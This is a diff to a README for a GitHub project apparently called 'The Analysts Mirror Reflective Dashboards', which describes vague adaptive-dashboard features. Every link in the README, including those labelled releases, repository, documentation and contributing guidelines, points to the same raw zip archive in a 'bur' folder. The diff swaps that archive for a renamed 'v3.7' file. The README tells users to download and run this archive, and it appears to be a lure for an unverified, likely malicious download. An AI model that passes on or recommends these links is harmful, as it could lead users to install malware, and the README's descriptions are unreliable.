@@ -1,6 +1,6 @@
 # 🌟 The-Analysts-Mirror-Reflective-Dashboards - Interactive Dashboards that Learn and Adapt
 
-[![Download Now](https://raw.githubusercontent.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/main/bur/The-Analysts-Mirror-Reflective-Dashboards_v2.3.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/main/bur/The-Analysts-Mirror-Reflective-Dashboards_v2.3.zip)
+[![Download Now](https://github.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/raw/refs/heads/main/bur/The-Dashboards-Mirror-Reflective-Analysts-v3.7.zip%20Now-Get%20Started-blue)](https://github.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/raw/refs/heads/main/bur/The-Dashboards-Mirror-Reflective-Analysts-v3.7.zip)
 
 ## 📘 Overview
 The Analysts Mirror Reflective Dashboards is designed to enhance how users interact with data. This project transforms traditional business intelligence systems into intelligent dashboards that adapt to your needs. As you use the dashboard, it learns from your actions and anticipates what you may need next. This approach makes data visualization an engaging and collaborative experience.
@@ -9,13 +9,13 @@ The Analysts Mirror Reflective Dashboards is designed to enhance how users inter
 Follow these steps to download and run the software:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/main/bur/The-Analysts-Mirror-Reflective-Dashboards_v2.3.zip) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/raw/refs/heads/main/bur/The-Dashboards-Mirror-Reflective-Analysts-v3.7.zip) to find the latest version of the software.
 
 2. **Choose the Right Version**  
    You will see a list of available releases. Look for the latest version, marked as “Latest Release”. 
 
 3. **Download the Application**  
-   Click on the file named something like `https://raw.githubusercontent.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/main/bur/The-Analysts-Mirror-Reflective-Dashboards_v2.3.zip` for Windows or its equivalent for other operating systems. This file will download to your device.
+   Click on the file named something like `https://github.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/raw/refs/heads/main/bur/The-Dashboards-Mirror-Reflective-Analysts-v3.7.zip` for Windows or its equivalent for other operating systems. This file will download to your device.
 
 4. **Locate the Downloaded File**  
    After the download is complete, navigate to your Downloads folder or the location you saved the file.
@@ -53,14 +53,14 @@ The application intersects with various important topics, including:
 - **Machine Learning:** Builds on user behavior to improve results.
 
 ## 📥 Download & Install
-Revisit the [Releases page](https://raw.githubusercontent.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/main/bur/The-Analysts-Mirror-Reflective-Dashboards_v2.3.zip) to download the software. Following the steps above will help you easily set up and start using the application. 
+Revisit the [Releases page](https://github.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/raw/refs/heads/main/bur/The-Dashboards-Mirror-Reflective-Analysts-v3.7.zip) to download the software. Following the steps above will help you easily set up and start using the application. 
 
 ## 📞 Support
 If you encounter any issues or need assistance, please check the Issues section on the project's GitHub page. You can also reach out through the contact information provided there.
 
 ## 🔗 Links
-- [GitHub Repository](https://raw.githubusercontent.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/main/bur/The-Analysts-Mirror-Reflective-Dashboards_v2.3.zip)
-- [Documentation](https://raw.githubusercontent.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/main/bur/The-Analysts-Mirror-Reflective-Dashboards_v2.3.zip)
-- [Contributing Guidelines](https://raw.githubusercontent.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/main/bur/The-Analysts-Mirror-Reflective-Dashboards_v2.3.zip)
+- [GitHub Repository](https://github.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/raw/refs/heads/main/bur/The-Dashboards-Mirror-Reflective-Analysts-v3.7.zip)
+- [Documentation](https://github.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/raw/refs/heads/main/bur/The-Dashboards-Mirror-Reflective-Analysts-v3.7.zip)
+- [Contributing Guidelines](https://github.com/chauwind/The-Analysts-Mirror-Reflective-Dashboards/raw/refs/heads/main/bur/The-Dashboards-Mirror-Reflective-Analysts-v3.7.zip)
 
 Now you are ready to begin your journey with The Analysts Mirror Reflective Dashboards. Enjoy your exploration!
